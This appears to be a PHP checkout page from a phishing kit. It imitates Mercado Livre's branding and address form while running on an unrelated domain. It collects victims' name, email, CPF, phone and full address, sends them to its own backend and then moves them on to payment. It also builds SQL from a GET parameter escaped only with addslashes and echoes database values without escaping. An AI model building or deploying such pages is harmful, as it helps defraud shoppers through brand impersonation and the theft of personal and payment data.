<?php 
session_start();
require_once("api/db.php");

if (!isset($_GET["produto"])) {
    session_destroy();
    header("Location: https://www.lojavirtual.com.br/");
    exit();
} else {
    $id = addslashes($_GET["produto"]);
    $sqlx = mysqli_query($conn, "SELECT * from produto WHERE codigo='$id'");
    if(mysqli_num_rows($sqlx) > 0){
        if($_SESSION['session_checkout'] > time()){
            $sql = mysqli_query($conn, "SELECT * from config");
            while($row = mysqli_fetch_array($sql)){ 
                $cor = $row["cor"];
                $nome = $row["nome"];
            }
            $sql1 = mysqli_query($conn, "SELECT * from produto WHERE codigo='$id'");
            while($row1 = mysqli_fetch_array($sql1)){ 
                $codigo = $row1["codigo"];
                $nomeproduto = $row1["nome"];
                $valor = $row1["valor"];
                $img = $row1["img"];
            }
            $_SESSION['session_address'] = time() + 1000;
        } else {
            session_destroy();
            header("Location: https://www.lojavirtual.com.br/");
            exit();
        }
    } else {
        session_destroy();
        header("Location: https://www.lojavirtual.com.br/");
        exit();
    }
}
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>Adicione um endereço - Mercado Livre</title>
    <link rel="shortcut icon" href="./arquivos/favicon.png?v=2">
    <link rel="icon" type="image/png" href="./arquivos/favicon.png?v=2">
    <link rel="stylesheet" href="./arquivos/fa.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;500;600;700&display=swap');
        body { font-family: "Montserrat", "Proxima Nova", "Helvetica Neue", Helvetica, Arial, sans-serif; background-color: #f5f5f5; margin: 0; padding: 0; color: #333; }
        header { background-color: #ffe600; padding: 12px 20px; display: flex; align-items: center; justify-content: space-between; }
        .logo { height: 34px; }
        .contact-link { color: #333; text-decoration: none; font-size: 13px; font-weight: 600; }
        .container { max-width: 1000px; margin: 30px auto; display: flex; gap: 30px; padding: 0 15px; flex-wrap: wrap; }
        .form-content { flex: 2; min-width: 300px; }
        .summary-content { flex: 1; min-width: 300px; }
        .section-title { font-size: 24px; font-weight: 600; margin-bottom: 25px; }
        .form-card { background: #fff; border-radius: 8px; padding: 30px; box-shadow: 0 1px 2px rgba(0,0,0,0.1); }
        .form-group { margin-bottom: 20px; }
        .form-group label { display: block; font-size: 14px; margin-bottom: 8px; color: #333; }
        .form-control { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 6px; font-size: 16px; box-sizing: border-box; }
        .form-control:focus { border-color: #3483fa; outline: none; }
        .form-row { display: flex; gap: 15px; }
        .form-row .form-group { flex: 1; }
        .helper-text { font-size: 12px; color: #999; margin-top: 4px; }
        .summary-card { background: #fff; border-radius: 8px; padding: 20px; box-shadow: 0 1px 2px rgba(0,0,0,0.1); }
        .summary-product { display: flex; gap: 12px; align-items: center; padding-bottom: 15px; border-bottom: 1px solid #eee; margin-bottom: 15px; }
        .summary-img { width: 48px; height: 48px; object-fit: contain; }
        .summary-name { font-size: 13px; color: #666; line-height: 1.2; }
        .summary-total-row { display: flex; justify-content: space-between; font-size: 18px; font-weight: 600; }
        .btn-next { display: block; width: 100%; background: #3483fa; color: #fff; text-align: center; padding: 15px; border-radius: 6px; font-weight: 600; border: none; cursor: pointer; font-size: 16px; margin-top: 25px; }
        .btn-next:hover { background: #2968c8; }
        .radio-group { display: flex; gap: 20px; margin-top: 10px; }
        .radio-item { display: flex; align-items: center; gap: 8px; font-size: 14px; cursor: pointer; }
        @media (max-width: 768px) {
            .container { flex-direction: column; }
            .summary-content { order: -1; }
        }
    </style>
</head>
<body>
    <header>
        <img src="./arquivos/logo-mercadolivre.png" alt="Mercado Livre" class="logo">
        <a href="#" class="contact-link">Contato</a>
    </header>

    <div class="container">
        <div class="form-content">
            <div class="section-title">Adicione um endereço</div>
            <form id="addressForm" class="form-card" onsubmit="event.preventDefault(); proceed();">
                <div class="form-group">
                    <label>Nome completo</label>
                    <input type="text" id="nome" class="form-control" required>
                    <div class="helper-text">Como aparece no seu Rg ou CNH.</div>
                </div>
                <div class="form-group">
                    <label>E-mail</label>
                    <input type="email" id="email" class="form-control" placeholder="exemplo@email.com" required>
                    <div class="helper-text">Para onde enviaremos o comprovante da sua compra.</div>
                </div>
                <div class="form-group">
                    <label>CPF</label>
                    <input type="tel" id="cpf" class="form-control" placeholder="Somente números" required maxlength="14">
                </div>
                <div class="form-row">
                    <div class="form-group">
                        <label>CEP</label>
                        <input type="tel" id="cep" class="form-control" required maxlength="9">
                    </div>
                    <div class="form-group" style="display: flex; align-items: flex-end; padding-bottom: 12px;">
                        <a href="#" style="color: #3483fa; font-size: 13px; text-decoration: none;">Não sei o meu CEP</a>
                    </div>
                </div>
                <div class="form-row">
                    <div class="form-group">
                        <label>Estado</label>
                        <input type="text" id="estado" class="form-control" required>
                    </div>
                    <div class="form-group">
                        <label>Cidade</label>
                        <input type="text" id="cidade" class="form-control" required>
                    </div>
                </div>
                <div class="form-group">
                    <label>Bairro</label>
                    <input type="text" id="bairro" class="form-control" required>
                </div>
                <div class="form-row">
                    <div class="form-group" style="flex: 2;">
                        <label>Rua/Avenida</label>
                        <input type="text" id="rua" class="form-control" required>
                    </div>
                    <div class="form-group">
                        <label>Número</label>
                        <input type="text" id="numero" class="form-control" required>
                    </div>
                </div>
                <div class="form-group">
                    <label>Complemento (opcional)</label>
                    <input type="text" id="complemento" class="form-control">
                </div>
                <div class="form-group">
                    <label>Tipo de endereço</label>
                    <div class="radio-group">
                        <label class="radio-item"><input type="radio" name="tipo" value="trabalho"> 🏢 Trabalho</label>
                        <label class="radio-item"><input type="radio" name="tipo" value="residencial" checked> 🏠 Residencial</label>
                    </div>
                </div>
                <div class="form-group">
                    <label>Telefone / WhatsApp</label>
                    <input type="tel" id="telefone" class="form-control" placeholder="(99) 999999999" required>
                </div>

                <button type="submit" class="btn-next">Continuar</button>
            </form>
        </div>

        <div class="summary-content">
            <div class="summary-card">
                <div style="font-size: 16px; font-weight: 600; margin-bottom: 15px;">Resumo da compra</div>
                <div class="summary-product">
                    <?php 
                    // Verifica se a imagem é uma URL (começa com http) ou um arquivo local
                    $img_src = (strpos($img, 'http') === 0) ? $img : "./arquivos/produtos/$codigo/$img";
                    ?>
                    <img src="<?php echo $img_src; ?>" alt="Produto" class="summary-img">
                    <div class="summary-name"><?php echo $nomeproduto; ?></div>
                </div>
                <div class="summary-total-row">
                    <span style="font-size: 14px; font-weight: 400;">Você pagará</span>
                    <span id="displayTotal">R$ 0,00</span>
                </div>
            </div>
        </div>
    </div>

    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
    <script>
        $(document).ready(function(){
            $('#cpf').mask('000.000.000-00');
            $('#cep').mask('00000-000');
            $('#telefone').mask('(00) 00000-0000');

            const data = JSON.parse(localStorage.getItem('lojavirtual') || '{}');
            if(data.precoFinal) {
                $('#displayTotal').text('R$ ' + data.precoFinal);
            }

            $('#cep').blur(function(){
                const cep = $(this).val().replace(/\D/g, '');
                if(cep.length === 8) {
                    $.getJSON(`https://viacep.com.br/ws/${cep}/json/`, function(json){
                        if(!json.erro) {
                            $('#rua').val(json.logradouro);
                            $('#bairro').val(json.bairro);
                            $('#cidade').val(json.localidade);
                            $('#estado').val(json.uf);
                            $('#numero').focus();
                        }
                    });
                }
            });
        });

        function proceed() {
            const nome      = $('#nome').val().trim();
            const email     = $('#email').val().trim();
            const cpf       = $('#cpf').val().trim();
            const telefone  = $('#telefone').val().trim();
            const cep       = $('#cep').val().trim();
            const rua       = $('#rua').val().trim();
            const numero    = $('#numero').val().trim();
            const bairro    = $('#bairro').val().trim();
            const cidade    = $('#cidade').val().trim();
            const estado    = $('#estado').val().trim();
            const complemento = $('#complemento').val().trim();

            // Validação básica dos campos obrigatórios
            if (!nome || !email || !cpf || !telefone || !cep || !rua || !numero || !bairro || !cidade) {
                alert('Por favor, preencha todos os campos obrigatórios.');
                return;
            }

            const formData = { nome, email, cpf, cep, rua, numero, bairro, cidade, estado, telefone, complemento };
            localStorage.setItem('cliente_dados', JSON.stringify(formData));

            const btn = document.querySelector('.btn-next');
            if (btn) { btn.disabled = true; btn.innerText = 'Aguarde...'; }

            // Passo 1: Salvar dados pessoais (case "checkout" no api/index.php)
            $.post("api/", {
                api:     "checkout",
                nome:    nome,
                email:   email,
                cpf:     cpf,
                celular: telefone
            }, function() {
                // Passo 2: Salvar endereço (case "address" no api/index.php)
                $.post("api/", {
                    api:          "address",
                    cep:          cep,
                    endereco:     rua,
                    numero:       numero,
                    bairro:       bairro,
                    cidade:       cidade + (estado ? ' - ' + estado : ''),
                    complemento:  complemento,
                    destinatario: nome
                }, function() {
                    window.location.href = 'payment.php?produto=<?php echo $codigo; ?>';
                }).fail(function() {
                    window.location.href = 'payment.php?produto=<?php echo $codigo; ?>';
                });
            }).fail(function() {
                window.location.href = 'payment.php?produto=<?php echo $codigo; ?>';
            });
        }
    </script>
</body>
</html>
